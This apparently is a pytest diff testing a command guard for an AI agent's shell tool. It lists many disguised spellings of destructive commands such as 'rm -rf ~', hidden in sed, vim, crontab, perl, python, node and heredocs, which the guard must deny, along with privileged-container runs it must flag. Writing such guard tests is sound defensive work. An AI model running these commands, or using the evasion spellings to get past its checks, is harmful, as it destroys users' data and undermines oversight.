+    "git -c protocol.version=2 fetch",
+    "git commit -m 'rm -rf ~ is bad'",
+    "echo rm -rf ~",
+    "grep -rn 'rm -rf' src",
+]
+
+
+def _prog_rule(prog: str | None) -> list[Rule] | None:
+    return [Rule(tool="bash", pattern=f"{prog} *", action="allow", layer=1)] if prog else None
+
+
+@pytest.mark.parametrize("ruled", [False, True], ids=["builtin", "user"])
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize(("prog", "cmd"), DERIVED_RUNS)
+def test_a_command_derived_from_a_word_is_scanned(tmp_path: Path, prog: str, cmd: str, mode: str, ruled: bool) -> None:
+    rules = _prog_rule(prog if ruled else None)
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action == "deny" and dec.hardline, (cmd, mode, dec.action)
+
+
+@pytest.mark.parametrize("cmd", DERIVED_RUNS_KEEP)
+def test_a_harmless_derived_value_is_not_refused(tmp_path: Path, cmd: str) -> None:
+    assert hardline.check(cmd, cwd=str(tmp_path), home=str(tmp_path / "home")) is None, cmd
+
+
+@pytest.mark.parametrize(
+    "cmd", ["x " + "rm " * 9000, "x " + "-ca=b=c=d=rm " * 9000, "x '" + "+!a " * 22000 + "'", "env " + "A=" * 45000]
+)
+def test_deriving_commands_from_words_stays_fast(tmp_path: Path, cmd: str) -> None:
+    start = time.perf_counter()
+    _decide(cmd, "auto", tmp_path)
+    assert time.perf_counter() - start < 1.0, cmd[:40]
+
+
+#: review 10: option values of non-text programs, vim filters over an Ex range, sed ``s///e``, scheduler pipes
+ROUND10_RUNS = [
+    ("watch", "watch -p rm -rf ~"),
+    ("unbuffer", "unbuffer -p rm -rf ~"),
+    ("chronic", "chronic -e rm -rf ~"),
+    ("foo", "foo -m rm -rf ~"),
+    ("tar", "tar -L1 -F 'rm -rf ~' -cf a d"),
+    ("git", "git -c core.pager='chronic -e rm -rf ~' log"),
+    ("sh", "sh -c 'unbuffer -p rm -rf ~'"),
+    ("hg", "hg pull -e 'rm -rf ~'"),
+    ("vim", "vim -c '%!rm -rf ~' x"),
+    ("vim", "vim -c '1,$!rm -rf ~' x"),
+    ("vim", "vim -c '.!rm -rf ~' x"),
+    ("vim", "vim -c '1!rm -rf ~' x"),
+    ("vim", "vim -c 'silent %!rm -rf ~' x"),
+    ("vim", "vim +'%!rm -rf ~' x"),
+    ("nvim", "nvim -c '%!rm -rf ~'"),
+    ("sed", "sed 's/.*/rm -rf ~/e' f"),
+    ("sed", "sed -e 's/x/rm -rf ~/e'"),
+    ("sed", "sed 's#a#rm -rf ~#e'"),
+    ("sed", "sed 's/a/rm -rf ~/ge' f"),
+    ("echo", "echo 'rm -rf ~' | at now"),
+    ("printf", "printf 'rm -rf ~' | at now + 1 minute"),
+    ("echo", "echo 'rm -rf ~' | batch"),
+    ("echo", "echo '* * * * * rm -rf ~' | crontab -"),
+    ("echo", "echo '@reboot rm -rf ~' | crontab -"),
+]
+ROUND10_KEEP = [
+    "git commit -m 'rm -rf ~ is bad'",
+    "hg commit -m 'rm -rf ~ is bad'",
+    "grep -e 'rm -rf' src",
+    "rg -e 'rm -rf ~' docs",
+    "grep -rn 'rm -rf' src",
+    "echo rm -rf ~",
+    "man -p x ls",
+    "git log --grep='rm -rf'",
+    "sed -i 's/rm -rf/echo/' file",
+    "sed 's/a/b/g' f",
+    "sed -n '/rm -rf/p' f",
+    "sed 's/a/b/ge' f",
+    "echo hi | at now",
+    "crontab -l",
+    "crontab file",
+    "mkdir -p a/b",
+    "pytest -p no:cacheprovider",
+    "vim -c 'set nu' x",
+]
+
+
+@pytest.mark.parametrize("ruled", [False, True], ids=["builtin", "user"])
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize(("prog", "cmd"), ROUND10_RUNS)
+def test_option_values_filters_sed_e_and_scheduled_text_are_scanned(
+    tmp_path: Path, prog: str, cmd: str, mode: str, ruled: bool
+) -> None:
+    rules = _prog_rule(prog if ruled else None)
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action == "deny" and dec.hardline, (cmd, mode, dec.action)
+
+
+@pytest.mark.parametrize("cmd", ROUND10_KEEP)
+def test_messages_patterns_and_benign_schedules_are_not_refused(tmp_path: Path, cmd: str) -> None:
+    assert hardline.check(cmd, cwd=str(tmp_path), home=str(tmp_path / "home")) is None, cmd
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        " ".join(["sed", "-e"] + ["s/a/b/e"] * 3000),
+        "vim -c '" + "1," * 15000 + "'",
+        "sed '" + "s/a" * 10000 + "'",
+        "echo '" + "x " * 15000 + "' | crontab -",
+    ],
+    ids=["sed-e", "vim-range", "sed-delims", "crontab"],
+)
+def test_scanning_sed_vim_and_crontab_text_stays_fast(tmp_path: Path, cmd: str) -> None:
+    start = time.perf_counter()
+    _decide(cmd, "auto", tmp_path)
+    assert time.perf_counter() - start < 1.0, cmd[:40]
+
+
+CONTAINER_TAKEOVER_SPELLINGS = [
+    ("docker", "docker run --privileged=true img"),
+    ("docker", "docker run --privileged=1 img"),
+    ("docker", "docker exec --privileged c sh"),
+    ("ctr", "ctr run --privileged img id"),
+    ("docker", "docker run --device-cgroup-rule='a *:* rwm' img"),
+]
+
+
+@pytest.mark.parametrize("ruled", [False, True], ids=["builtin", "user"])
+@pytest.mark.parametrize("mode", ["default", "auto"])
+@pytest.mark.parametrize(("prog", "cmd"), CONTAINER_TAKEOVER_SPELLINGS)
+def test_every_spelling_of_a_privileged_container_needs_a_human(
+    tmp_path: Path, prog: str, cmd: str, mode: str, ruled: bool
+) -> None:
+    rules = _prog_rule(prog if ruled else None)
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action == "ask" and dec.needs_human, (cmd, mode, dec.action)
+
+
+@pytest.mark.parametrize("cmd", ["docker run --rm img", "docker run --privileged=false img"])
+def test_an_unprivileged_container_needs_no_human(tmp_path: Path, cmd: str) -> None:
+    dec = decide(mode="auto", tool="bash", args={"command": cmd}, cwd=tmp_path)
+    assert dec.action == "allow" and not dec.needs_human, cmd
+
+
+#: review 11: a catastrophic run anywhere in a non-text program's raw text (the raw-text backstop)
+RAW_TEXT_RUNS = [
+    ("find", "find . -exec sed 's/.*/rm -rf ~/e' {} \\;"),
+    ("watch", "watch sed 's/.*/rm -rf ~/e' f"),
+    ("fd", "fd -x sed 's/.*/rm -rf ~/e'"),
+    ("foo", "foo sed 's/.*/rm -rf ~/e' f"),
+    ("vim", "vim -c 'g/x/!rm -rf ~' f"),
+    ("vim", "vim -c 'g!/x/!rm -rf ~' f"),
+    ("vim", "vim -c 'v/x/!rm -rf ~' f"),
+    ("vim", "vim -c '%g/x/!rm -rf ~' f"),
+    ("vim", "vim -c 'global/x/!rm -rf ~' f"),
+    ("vim", "vim -c \"'a,'b!rm -rf ~\" f"),
+    ("sed", "sed -e's/x/rm -rf ~/e' f"),
+    ("sed", "sed -ne's/x/rm -rf ~/e' f"),
+    ("sed", "sed '/x/Is/.*/rm -rf ~/e' f"),
+    ("sed", "sed '\\%x%s%.*%rm -rf ~%e' f"),
+    ("sed", "sed 's/.*/\\x72m -rf ~/e' f"),
+    ("sed", "sed 's/.*/true\\nrm -rf ~/e' f"),
+    ("tar", "tar -xF'rm -rf ~' -f a"),
+    ("tar", "tar -cL1F'rm -rf ~' -f a x"),
+    ("at", "echo 'rm -rf ~' | at now | cat"),
+    ("at", "echo 'rm -rf ~' | at now 2>&1 | tee log"),
+    ("at", "{ echo 'rm -rf ~'; } | at now"),
+    ("at", "echo 'rm -rf ~' | at -f /dev/stdin now"),
+    ("crontab", "echo '* * * * * rm -rf ~' | crontab /dev/stdin"),
+    ("crontab", "echo '* * * * * rm -rf ~' | crontab"),
+]
+RAW_TEXT_KEEP = [
+    "git commit -m 'rm -rf ~ is bad'",
+    "hg commit -m 'rm -rf ~ is bad'",
+    "echo rm -rf ~",
+    "grep -rn 'rm -rf' src",
+    "rg 'rm -rf ~' docs",
+    "git log --grep='rm -rf'",
+    "sed -i 's/rm -rf/echo/' file",
+    "sed -n '/rm -rf/p' f",
+    "awk '/rm -rf/' f",
+    "pytest -k 'rm or dd'",
+    "rm -rf build/",
+    "rm -rf ~/proj/build",
+    "sudo rm -rf /usr/local/lib/foo",
+    "rm -f a b c",
+    "find . -name '*.pyc' -delete",
+    "dd if=a of=b",
+    "docker run --rm img rm -rf /tmp/x",
+    "cat > x.sh <<'EOF'\nrm -rf ~\nEOF",
+    "echo hi | at now",
+    "crontab -l",
+    "crontab jobs.txt",
+    "at -f job.sh now",
+    "vim -c 'set ft=c' f",
+    "tar czf a.tgz src",
+]
+
+
+@pytest.mark.parametrize("ruled", [False, True], ids=["builtin", "user"])
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize(("prog", "cmd"), RAW_TEXT_RUNS)
+def test_a_catastrophic_run_in_raw_text_is_refused(tmp_path: Path, prog: str, cmd: str, mode: str, ruled: bool) -> None:
+    rules = _prog_rule(prog if ruled else None)
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action == "deny" and dec.hardline, (cmd, mode, dec.action)
+
+
+@pytest.mark.parametrize("cmd", RAW_TEXT_KEEP)
+def test_raw_text_that_only_mentions_a_run_is_not_refused(tmp_path: Path, cmd: str) -> None:
+    dec = decide(mode="auto", tool="bash", args={"command": cmd}, cwd=tmp_path)
+    assert dec.action == "allow" and not dec.hardline, (cmd, dec.action)
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "foo " + "a/rm " * 9999,
+        "foo " + "'rm -rf a' " * 4000,
+        "foo 'rm " + "a " * 45000 + "'",
+        "foo " + "s/x/rm\\x20" * 9000,
+    ],
+)
+def test_the_raw_text_scan_stays_fast(tmp_path: Path, cmd: str) -> None:
+    start = time.perf_counter()
+    _decide(cmd, "auto", tmp_path)
+    assert time.perf_counter() - start < 1.0, cmd[:40]
+
+
+# ── the raw-text backstop: run terminators, the argument window, text-program exec options, oversize input ──
+
+#: (program a ``prog *`` allow rule names, command): a closing brace or bracket ends a run and an opening one starts
+#: it (the target was read as ``~}``), and a text program's command-running option is read like any program's.
+BACKSTOP_DENY: list[tuple[str, str]] = [
+    ("ruby", "ruby -e 'system(%q{rm -rf ~})'"),
+    ("ruby", "ruby -e 'system(%q{rm -rf /})'"),
+    ("perl", "perl -e 'qx{rm -rf ~}'"),
+    ("perl", "perl -e 'exec q{rm -rf $HOME}'"),
+    ("perl", "perl -e 'system(q[rm -rf ~])'"),
+    ("ruby", "ruby -e '%x[rm -rf ~]'"),
+    ("lua", "lua -e 'os.execute([[rm -rf ~]])'"),
+    ("ag", "ag --pager='rm -rf ~' x"),
+    ("ag", "ag --pre='rm -rf ~' x"),
+]
+
+
+@pytest.mark.parametrize("rule", [False, True])
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize(("prog", "cmd"), BACKSTOP_DENY)
+def test_the_backstop_ends_runs_at_braces_and_reads_text_program_exec_options(
+    tmp_path: Path, prog: str, cmd: str, mode: str, rule: bool
+) -> None:
+    rules = [Rule(tool="bash", pattern=f"{prog} *", action="allow", layer=1)] if rule else []
+    d = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert d.action == "deny", (cmd, mode, rule)
+
+
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+def test_a_braced_home_is_still_home_and_its_subfolders_keep_their_decision(tmp_path: Path, mode: str) -> None:
+    assert _decide("rm -rf ${HOME}", mode, tmp_path).action == "deny"
+    assert _decide("perl -e 'system(\"rm -rf ${HOME}\")'", mode, tmp_path).action == "deny"
+    assert _decide("rm -rf ${HOME}/proj/build", mode, tmp_path).action != "deny"
+
+
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+def test_the_run_window_still_reads_a_recursive_deletes_last_target(tmp_path: Path, mode: str) -> None:
+    pad = " ".join(f"a{i}" for i in range(40))
+    assert _decide(f"perl -e 'system(\"rm -rf {pad} ~\")'", mode, tmp_path).action == "deny"
+    assert _decide(f"perl -e 'system(\"rm -rf ~ {pad}\")'", mode, tmp_path).action == "deny"
+
+
+@pytest.mark.serial  # wall-clock limit; load-sensitive under the 8-worker run, passes alone
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+def test_a_long_path_list_naming_run_programs_is_not_refused(tmp_path: Path, mode: str) -> None:
+    paths = [f"src/pkg{i}/mod{i}.py" for i in range(3000)]
+    start = time.perf_counter()
+    plain = _decide("git add " + " ".join(paths), mode, tmp_path).action
+    took = time.perf_counter() - start  # the engine's own cost for 3,000 words: under load it nears a second
+    paths[100], paths[1500], paths[2900] = "tools/install", "lib/cp", "docs/git"
+    start = time.perf_counter()
+    d = _decide("git add " + " ".join(paths), mode, tmp_path)
+    assert time.perf_counter() - start < max(1.0, 2 * took)
+    assert (d.action, d.hardline) == (plain, None)
+
+
+@pytest.mark.serial  # wall-clock limit; load-sensitive under the 8-worker run, passes alone
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+def test_an_oversize_line_of_short_runs_is_refused_fast(tmp_path: Path, mode: str) -> None:
+    seg = "awk '" + " ".join(["rm"] * 260) + "' f"
+    start = time.perf_counter()
+    d = _decide(" ; ".join([seg] * 40), mode, tmp_path)
+    assert time.perf_counter() - start < 1.0
+    assert d.action != "allow" and "too large to check" in (d.message or "")
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "python3 -c '" + " ".join(f'"rm a{i}"' for i in range(3000)) + "'",
+        "python3 -c '" + " ".join(f'"cd a{i}"' for i in range(3000)) + "'",
+        "echo a | sh -s | " * 200 + "sh",
+        "python3 <<'EOF'\n" + "".join(f'x("rm a{i}")\n' for i in range(3000)) + "EOF",
+    ],
+)
+def test_the_payload_and_producer_scans_stay_fast(tmp_path: Path, cmd: str) -> None:
+    start = time.perf_counter()
+    _decide(cmd, "auto", tmp_path)
+    assert time.perf_counter() - start < 1.0, cmd[:40]
+
+
+#: review 12: a command line in a quoted literal of a program's code (`$IFS`, braces, a cd), a group or compound
+#: command piped to a stdin runner, and a heredoc an interpreter runs as its program
+PAYLOAD_RUNS = [
+    ("awk", "awk 'BEGIN{system(\"rm${IFS}-rf${IFS}$HOME\")}'"),
+    ("python3", "python3 -c 'import os;os.system(\"rm$IFS-rf$IFS~\")'"),
+    ("python3", "python3 -c 'import os;os.system(\"rm${IFS}-rf${IFS}/\")'"),
+    ("python3", "python3 -c 'import os;os.system(\"{rm,-rf,~}\")'"),
+    ("perl", "perl -e 'system(\"cd;rm -rf .\")'"),
+    ("perl", "perl -e 'system(\"cd ~;rm -rf *\")'"),
+    ("python3", "python3 -c 'import os;os.system(\"cd / && rm -rf *\")'"),
+    ("at", "{ echo 'rm -rf ~'; true; } | at now"),
+    ("sh", "{ echo 'rm -rf ~'; true; } | sh"),
+    ("bash", "( echo 'rm -rf ~'; : ) | bash"),
+    ("sh", "{ printf 'rm -rf ~'; } 2>/dev/null | sh"),
+    ("at", "{ { echo 'rm -rf ~'; }; } | at now"),
+    ("at", "if true; then echo 'rm -rf ~'; fi | at now"),
+    ("at", "for i in 1; do echo 'rm -rf ~'; done | at now"),
+    ("at", "f(){ echo 'rm -rf ~'; }; f | at now"),
+    ("at", "echo 'rm -rf ~' | (at now)"),
+    ("at", "echo 'rm -rf ~' | { at now; }"),
+    ("python3", "python3 <<'EOF'\nimport os\nos.system(\"rm -rf ~\")\nEOF"),
+    ("perl", "perl <<'EOF'\nsystem(\"rm -rf ~\");\nEOF"),
+    ("cat", "cat <<'EOF' | python3\nimport os\nos.system(\"rm -rf ~\")\nEOF"),
+    ("ruby", "ruby <<EOF\nsystem('rm -rf ~')\nEOF"),
+    ("node", "node <<EOF\nrequire('child_process').execSync('rm -rf ~')\nEOF"),
+    ("python3", "python3 <<'EOF'\nimport os\nos.system(\"rm${IFS}-rf${IFS}~\")\nEOF"),
+]
+PAYLOAD_KEEP = [
+    "python3 -c 'print(\"rm -rf build\")'",
+    "python3 -c 'import os;os.system(\"ls\")'",
+    "python3 -c 'import os;os.system(\"cd src && make\")'",
+    "{ echo hi; true; } | sh",
+    "echo hi | at now",
+    "perl -e 'print 1'",
+    "awk 'BEGIN{print 1}'",
+    "cd src && make",
+    "git commit -m 'rm -rf ~ is bad'",
+    "git commit -m 'say \"rm -rf ~\"'",
+    "python3 <<'EOF'\nprint('hi')\nEOF",
+    "python3 <<'EOF'\nimport shutil\nshutil.rmtree(\"build\")\nEOF",
+    "cat > x.sh <<'EOF'\nrm -rf ~\nEOF",
+    "tee x.sh <<'EOF'\nrm -rf ~\nEOF",
+    "cat <<'EOF'\nrm -rf ~\nEOF",
+    "git commit -F - <<'EOF'\nrm -rf ~ was the bug\nEOF",
+    "echo 'rm -rf build' | sh",
+]
+
+
+@pytest.mark.parametrize("ruled", [False, True], ids=["builtin", "user"])
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize(("prog", "cmd"), PAYLOAD_RUNS)
+def test_a_command_line_a_payload_runs_is_refused(tmp_path: Path, prog: str, cmd: str, mode: str, ruled: bool) -> None:
+    rules = _prog_rule(prog if ruled else None)
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action == "deny" and dec.hardline, (cmd, mode, dec.action)
+
+
+@pytest.mark.parametrize("cmd", PAYLOAD_KEEP)
+def test_a_payload_that_runs_nothing_catastrophic_is_not_refused(tmp_path: Path, cmd: str) -> None:
+    assert hardline.check(cmd, cwd=str(tmp_path)) is None, cmd
+
+
+# Round 13: a perl/ruby quote operator's punctuation delimiter ends the run it starts (``qx!...!``), a pipe into an
+# interpreter with no code argument runs the producer's text, and an argv list reads as one command line.
+_R13_RM = "rm -" + "rf ~"
+_R13_ABS = "/" + "usr"  # an absolute system path: the real home is not the one decide() sees in tests
+R13_RUNS = [
+    ("perl", f"perl -e 'qx!{_R13_RM}!'"),
+    ("perl", f"perl -e 'system q#{_R13_RM}#'"),
+    ("ruby", f"ruby -e '%x^{_R13_RM}^'"),
+    *(("perl", f"perl -e 'qx{c}{_R13_RM}{c}'") for c in ",:*+=$%@?"),  # qx|...| was refused already: a | ends a run
+    ("perl", "perl -e 'qx~rm -" + "rf $HOME~'"),
+    *(
+        ("echo", f"echo 'system(\"{_R13_RM}\")' | {consumer}")
+        for consumer in (
+            "perl",
+            "python3",
+            "python3 -",
+            "ruby",
+            "node",
+            "tclsh",
+            "lua",
+            "php",
+            "parallel",
+            "xargs -I{} sh -c {}",
+            "source /dev/stdin",
+            ". /dev/stdin",
+            "tee >(sh)",
+            "sudo perl",
+            "env python3",
+            "nohup ruby",
+            "timeout 5 node",
+        )
+    ),
+    ("ruby", 'ruby -e \'system("rm", "-rf", "' + _R13_ABS + "\")'"),
+    ("python3", 'python3 -c \'import subprocess;subprocess.run(["rm","-rf","' + _R13_ABS + "\"])'"),
+    ("python3", "python3 -c \"import subprocess;subprocess.run(['rm', '-rf', '/'])\""),
+]
+R13_KEEP = [
+    "rm -rf ~/proj/build",
+    "/bin/rm -rf ~/proj/build",
+    "rm -rf ${HOME}/proj/build",
+    "perl -e 'qx!rm -rf ~/proj/build!'",
+    "echo 'print(1)' | python3",
+    "cat x.py | python3 -",
+    "echo hi | python3 -c 'print(1)'",
+    "echo x | python3 script.py",
+    "cat f | perl -ne 'print'",
+    "echo hi | node -e 'console.log(1)'",
+    "ls | xargs echo",
+    "ls | xargs wc -l",
+    "echo x | parallel echo {}",
+    "printf 'ls' | bash",
+]
+
+
+@pytest.mark.parametrize("ruled", [False, True], ids=["builtin", "user"])
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize(("prog", "cmd"), R13_RUNS)
+def test_a_quote_delimiter_stdin_interpreter_or_argv_list_run_is_refused(
+    tmp_path: Path, prog: str, cmd: str, mode: str, ruled: bool
+) -> None:
+    rules = _prog_rule(prog if ruled else None)
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action == "deny" and dec.hardline, (cmd, mode, dec.action)
+
+
+@pytest.mark.parametrize("cmd", R13_KEEP)
+def test_a_project_path_or_a_code_argument_stdin_is_not_refused(tmp_path: Path, cmd: str) -> None:
+    assert hardline.check(cmd, cwd=str(tmp_path)) is None, cmd
+
+
+# Review round 14: a catastrophic run at the end of an oversize line (past the word or the character limit), a GNU
+# unique prefix of --recursive, a sed `e` command glued to its command, and a node argv list `"rm", ["-rf", "/"]`
+_R14 = "rm -" + "rf ~"
+R14_RUNS = [
+    ("true", "; ".join(["true"] * 2005) + "; " + _R14),
+    ("true", "; ".join(["true"] * 20000) + "; " + _R14),
+    ("rm", "rm --rec -f ~"),
+    ("rm", "rm --r -f ~"),
+    ("rm", "rm --recu --fo ~"),
+    ("rm", "rm --recursiv ~"),
+    ("chmod", "chmod --rec 000 ~"),
+    ("chown", "chown --recu x ~"),
+    ("sed", "sed '1e" + _R14 + "' f"),
+    ("sed", "sed 'e" + _R14 + "' f"),
+    ("sed", "sed '$e" + _R14 + "' f"),
+    ("sed", "sed '/x/e" + _R14 + "' f"),
+    ("sed", "sed '1!e" + _R14 + "' f"),
+    ("find", "find . -exec sed '1e" + _R14 + "' {} +"),
+    ("node", 'node -e \'require("child_process").execFileSync("rm", ["-r' + 'f", "/"])\''),
+    ("node", "node -e \"spawnSync('rm',['-r" + "f','/'])\""),
+    ("node", "node <<'EOF'\nrequire('child_process').spawnSync('rm', ['-r" + "f', '/'])\nEOF"),
+]
+R14_KEEP = ["rm -r --force build/", "sed -n '1p' f", "sed 's/a/b/' f", "sed -e '1d' -e 's/x/y/' f", "ls | xargs wc -l"]
+
+
+@pytest.mark.parametrize("ruled", [False, True], ids=["builtin", "user"])
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize(("prog", "cmd"), R14_RUNS)
+def test_an_oversize_tail_long_option_prefix_sed_e_or_node_argv_run_is_refused(
+    tmp_path: Path, prog: str, cmd: str, mode: str, ruled: bool
+) -> None:
+    rules = _prog_rule(prog if ruled else None)
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action == "deny" and dec.hardline not in (None, "scan-budget", "too-large"), (cmd[-60:], mode, dec)
+
+
+@pytest.mark.parametrize("cmd", R14_KEEP)
+def test_a_plain_sed_script_or_a_forced_project_delete_is_not_refused(tmp_path: Path, cmd: str) -> None:
+    assert hardline.check(cmd, cwd=str(tmp_path)) is None, cmd
+
+
+def test_an_oversize_line_without_a_catastrophic_run_is_still_asked_about(tmp_path: Path) -> None:
+    for cmd in ("; ".join(["true"] * 2005), "; ".join(["true"] * 20000), "echo " + "a " * 12000):
+        dec = _decide(cmd, "default", tmp_path)
+        assert (dec.action, dec.hardline) == ("ask", None) and "too large to check" in (dec.message or ""), cmd[:40]
+
+
+def test_a_line_too_large_for_even_the_raw_scan_is_refused_in_every_mode(tmp_path: Path) -> None:
+    for mode in ("default", "auto", "yolo"):
+        dec = _decide("echo " + "a" * 1_100_000, mode, tmp_path)
+        assert (dec.action, dec.hardline) == ("deny", "too-large") and "too large to check" in (dec.message or "")
+
+
+_R14_PY = "python3 <<'EOF'\nimport subprocess\n" + "".join(
+    f'subprocess.run(["git", "add", "f{i}.py"]); print("step {i}: git add done")\n' for i in range(300)
+)
+_R14_NODE = "node <<'EOF'\n" + "".join(f'console.log("git tag v{i}");\n' for i in range(400))
+
+
+@pytest.mark.serial  # wall-clock limit; load-sensitive under the 8-worker run, passes alone
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize("cmd", [_R14_PY + "EOF", _R14_NODE + "EOF"], ids=["python-git", "node-git"])
+def test_a_heredoc_of_many_git_literals_is_not_refused_for_the_scan_budget(tmp_path: Path, cmd: str, mode: str) -> None:
+    start = time.perf_counter()
+    dec = _decide(cmd, mode, tmp_path)
+    assert time.perf_counter() - start < 1.0
+    assert dec.hardline is None and dec.action != "deny", (mode, dec)
+
+
+# Review round 15: a perl/ruby quote operator with any delimiter (``qx.``, ``%x-``, ``qx«``, a blank before the run),
+# and a ternary between two quoted arguments of a list (``system(1?"rm":0, "-rf", "/")``)
+_R15 = "rm -" + "rf ~"
+_R15_ROOT = "rm -" + "rf /"
+R15_RUNS = [
+    ("perl", "perl -e 'qx." + _R15 + ".'"),
+    ("perl", "perl -e 'qx-" + _R15 + "-'"),
+    ("perl", "perl -e 'qx. " + _R15 + ".'"),
+    ("perl", "perl -e 'exec qw." + _R15_ROOT + ".'"),
+    ("perl", "perl -Mutf8 -e 'qx«" + _R15 + "»'"),
+    ("perl", "perl <<'EOF'\nqx." + _R15 + ".;\nEOF"),
+    ("perl", 'perl -e \'system(1?"rm":0, "-r' + 'f", "/")\''),
+    ("ruby", "ruby -e '%x." + _R15 + ".'"),
+    ("ruby", "ruby -e '%x-" + _R15 + "-'"),
+    ("ruby", "ruby -e '%x- " + _R15 + "-'"),
+    ("ruby", "ruby -e 'exec %w." + _R15_ROOT + ".'"),
+]
+#: Decisions that stay as they were before round 15 (default without a rule, auto): no new over-deny.
+R15_KEEP = [
+    ("git commit -m '" + _R15 + " is bad'", "ask", "allow"),
+    ("echo hi | at now", "ask", "allow"),
+    ("rm -" + "rf build/", "ask", "allow"),
+    ("rm -" + "rf ${HOME}/proj/build", "ask", "allow"),
+    ("make clean", "ask", "allow"),
+    ("pytest -k 'rm or dd'", "ask", "allow"),
+    ("tar czf a.tgz src", "ask", "allow"),
+    ("grep -rn '" + "rm -" + "rf' src", "allow", "allow"),
+    ("python3 -c 'print(1)'", "ask", "allow"),
+    ("docker run --rm img", "ask", "allow"),
+    ("ls -rm", "allow", "allow"),
+    ("git add " + " ".join(f"p{i}.py" for i in range(3000)), "ask", "allow"),
+    ("cat > x.sh <<'EOF'\necho safe\nEOF", "ask", "allow"),
+    ("rm -r --force build/", "ask", "allow"),
+    ("perl -e 'print qw.a b.'", "ask", "allow"),
+    ("perl -e 'print qq-rm is a word-'", "ask", "allow"),
+]
+
+
+@pytest.mark.parametrize("ruled", [False, True], ids=["builtin", "user"])
+@pytest.mark.parametrize("mode", ["default", "auto", "yolo"])
+@pytest.mark.parametrize(("prog", "cmd"), R15_RUNS)
+def test_a_quote_operator_with_any_delimiter_or_a_ternary_list_run_is_refused(
+    tmp_path: Path, prog: str, cmd: str, mode: str, ruled: bool
+) -> None:
+    rules = _prog_rule(prog if ruled else None)
+    dec = decide(mode=mode, tool="bash", args={"command": cmd}, cwd=tmp_path, user_rules=rules)
+    assert dec.action == "deny" and dec.hardline not in (None, "scan-budget", "too-large"), (cmd, mode, dec)
+
+
+@pytest.mark.parametrize(("cmd", "default", "auto"), R15_KEEP, ids=[c[:30] for c, _, _ in R15_KEEP])
+def test_round_15_keeps_the_decisions_of_ordinary_commands(tmp_path: Path, cmd: str, default: str, auto: str) -> None:
+    assert (_decide(cmd, "default", tmp_path).action, _decide(cmd, "auto", tmp_path).action) == (default, auto)
